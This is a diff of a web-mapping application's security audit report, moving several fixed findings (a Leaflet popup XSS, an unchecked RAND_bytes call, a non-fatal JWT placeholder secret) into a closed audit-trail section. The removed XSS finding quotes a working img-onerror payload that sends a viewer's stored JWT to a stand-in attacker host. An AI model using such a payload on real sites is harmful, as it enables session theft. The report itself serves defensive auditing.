@@ -9,15 +9,17 @@
 
 ## Summary
 
-| Severity | New | Carried from previous audit | Total open |
-|---|---:|---:|---:|
-| High | 5 | 0 | 5 |
-| Medium | 8 | 5 | 13 |
-| Low | 5 | 0 | 5 |
+| Severity | Total open | Fixed since audit |
+|---|---:|---:|
+| High | 2 | 3 (H1, H2, H3 — see #55) |
+| Medium | 12 | 1 (M13 — fixed with H1) |
+| Low | 5 | 0 |
 
-No critical findings. The application has solid security fundamentals; open findings are either production-deployment concerns (Argon2id parameters, secret storage, HSTS) or specific hardening opportunities (XSS in Leaflet popups, resource-limit races).
+No critical findings. Remaining High items are production-deployment concerns (Argon2id parameters, SSO `client_secret` storage — tracked in #56).
 
 Deliberate design trade-offs are listed separately below.
+
+Closed findings are preserved at the bottom of the document for audit trail.
 
 ---
 
@@ -38,7 +40,7 @@ The application implements the following security controls (verified in this aud
 - **Audit logging:** `audit_log` records security events (login success/failure, registration, SSO login, member add/remove, permission changes) with atomic success/failure counters.
 - **Security headers:** `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`.
 - **CORS allowlist:** Origins listed in `allowed_origins` config; unknown origins receive no CORS headers.
-- **Secrets management:** `JWT_SECRET` env var overrides config. Minimum 32 characters enforced when env var is set. Config placeholders (`CHANGE_ME...`) trigger startup warnings.
+- **Secrets management:** `JWT_SECRET` env var overrides config, minimum 32 characters enforced. Config placeholders (`CHANGE_ME...`) cause fatal startup exit unless `ALLOW_PLACEHOLDER_SECRETS=1` is explicitly set (dev-only).
 - **Registration privacy at the login endpoint:** Login returns identical error for wrong password and nonexistent email.
 - **SSO enumeration resistance:** SSO initiate returns generic "SSO is not available" for all error cases.
 
@@ -59,52 +61,6 @@ The application implements the following security controls (verified in this aud
 ## Open findings
 
 ### High
-
-#### H1 (NEW): XSS via Leaflet popup HTML templates
-
-**Files:** `frontend/src/components/Map/AnnotationLayer.tsx:23-52`, `frontend/src/components/Map/NoteMarkers.tsx:48-55`
-
-`createPopupContent()` and the note-marker popup builder construct HTML via JS template literals that interpolate user-controlled fields (`annotation.title`, `annotation.description`, `media.url`, `media.caption`, `note.title`, `note.text`, `createdByUsername`) directly. The resulting string is passed to `layer.bindPopup(...)`, which Leaflet renders as HTML. An editor-permission user who writes `<img src=x onerror="fetch('https://attacker/?t='+localStorage.getItem('auth-storage'))">` into a note title exfiltrates every viewer's JWT.
-
-**Mitigation in place:** React escapes output in components, so this is limited to Leaflet popup code paths.
-
-**Fix:** Either sanitize via DOMPurify, or build the popup DOM with `document.createElement` + `textContent` (which Leaflet's `bindPopup` also accepts as a DOM node).
-
-**Effort:** Small (~30 lines).
-
----
-
-#### H2 (NEW): `RAND_bytes()` return value not checked in SSO state generation
-
-**File:** `backend/src/controllers/SsoController.cpp:13-20`
-
-```cpp
-std::string SsoController::generateRandom(int bytes) {
-    std::vector<unsigned char> buf(bytes);
-    RAND_bytes(buf.data(), bytes);  // return ignored
-    ...
-}
-```
-
-OpenSSL's `RAND_bytes` returns 1 on success, 0 if the RNG hasn't been seeded, or -1 if unsupported. On failure the buffer may be zero-initialized or partially populated, yielding predictable state/nonce values and defeating the SSO CSRF and replay protections.
-
-**Fix:** Throw on non-1 return. One-line change.
-
-**Effort:** Trivial.
-
----
-
-#### H3 (NEW): JWT secret placeholder warning should be fatal
-
-**File:** `backend/src/main.cpp:21-37`
-
-Deploying with `CHANGE_ME_USE_A_LONG_RANDOM_STRING` in `config.json` and no `JWT_SECRET` env var prints a `WARNING:` to stderr and keeps running. A missed startup log during production deployment would allow token forgery with a well-known secret.
-
-**Fix:** Exit with non-zero on placeholder detection unless `ALLOW_PLACEHOLDER_SECRETS=1` is explicitly set (for intentional dev builds).
-
-**Effort:** Trivial.
-
----
 
 #### H4 (NEW): Argon2id parameters set to `*_MIN` values
 
@@ -146,9 +102,9 @@ Nonce is generated and stored at initiate but never compared against the ID toke
 
 **File:** `frontend/src/store/authStore.ts`
 
-Persisted via Zustand's `persist` middleware. Any XSS (e.g., H1 above) reads the token.
+Persisted via Zustand's `persist` middleware. Any XSS reads the token.
 
-**Mitigations:** Security headers, input validation, H1 fix will close the currently-known XSS vector.
+**Mitigations:** Security headers, input validation, and the popup-XSS fix in #55 (H1, now closed) removed the most exploitable XSS vector.
 
 **Fix:** HttpOnly cookies require CSRF token infrastructure and backend changes (~100+ lines). Lower-effort intermediate: move to sessionStorage so the token is cleared on tab close.
 
@@ -268,18 +224,6 @@ Audit log currently captures: register, login success/failure, SSO login, member
 
 ---
 
-#### M13 (NEW): Frontend media URL rendering accepts any scheme
-
-**File:** `frontend/src/components/Map/AnnotationLayer.tsx:28-30`
-
-The backend validates `http`/`https` for media URLs on submission. The frontend re-renders stored URLs without its own scheme check. If backend validation is ever bypassed (direct DB insert, future API gap), the frontend would render `javascript:` or `data:text/html` URLs. Defense-in-depth gap.
-
-**Fix:** Validate scheme in `createPopupContent()` (same fix file as H1).
-
-**Effort:** Trivial.
-
----
-
 ### Low
 
 #### L1 (NEW): GeoJSON coordinate ranges not validated
@@ -357,3 +301,56 @@ These are known decisions, not findings. Documented for future auditors.
 ## Audit methodology
 
 Three parallel explore agents independently audited backend, frontend, and database layers. Their raw findings were cross-checked against source code by reading the cited file:line references. Findings that turned out to be non-issues (e.g., agents flagged `listTenants` as missing `TenantFilter` — correct behavior, no tenantId in path; flagged `username_taken` distinction as user-enumeration — intentional trade-off documented above) were removed. Severities were calibrated downward where agents were generous, and upward for a few items where agents underestimated exploitability.
+
+---
+
+## Closed findings (audit trail)
+
+### H1 — XSS via Leaflet popup HTML templates
+
+**Closed by PR #55 (2026-04-18).**
+
+Popup content for annotations and notes was built via template-literal
+interpolation of user fields (`annotation.title`, `annotation.description`,
+media URLs, note text, usernames) into HTML strings passed to
+`layer.bindPopup()`. Leaflet renders those strings as HTML, so an
+editor-role user could inject `<img src=x onerror=...>` payloads that ran
+in every viewer's browser.
+
+**Fix applied:** `AnnotationLayer.tsx` and `NoteMarkers.tsx` now build
+popup content as DOM nodes using `document.createElement` +
+`textContent`. Leaflet's `bindPopup` accepts HTMLElement directly.
+Event listeners for Edit/Move/Delete buttons are pre-attached to the
+elements during construction rather than re-queried inside a
+`popupopen` handler. This also closed M13 (frontend media URL scheme
+check) since the DOM-construction path explicitly validates `http:` /
+`https:` via `new URL(...).protocol` before rendering `<img>` or `<a>`.
+
+### H2 — `RAND_bytes()` return value not checked
+
+**Closed by PR #55 (2026-04-18).**
+
+`SsoController::generateRandom` ignored OpenSSL's `RAND_bytes` return
+value. On RNG failure the buffer stayed zero-initialized and state/nonce
+became deterministic, defeating the SSO CSRF and replay protections.
+
+**Fix applied:** `generateRandom` now throws on non-1 return. The
+`initiate` caller wraps state/nonce generation in try/catch and returns
+a generic `500 SSO is not available` on failure, consistent with the
+SSO enumeration-resistance posture.
+
+### H3 — JWT secret placeholder warning not fatal
+
+**Closed by PR #55 (2026-04-18).**
+
+Running the backend with `CHANGE_ME_...` as the JWT secret printed a
+`WARNING:` to stderr and kept going. A missed startup log during a
+production deployment would allow token forgery with a well-known
+secret.
+
+**Fix applied:** Placeholder detection at startup now exits non-zero
+unless `ALLOW_PLACEHOLDER_SECRETS=1` is explicitly set. The dev
+`docker-compose.yml` sets this env var with a comment explaining it
+must never appear in production compose/env files. An env var
+`JWT_SECRET` shorter than 32 characters also now exits fatally instead
+of silently falling back to the config value.
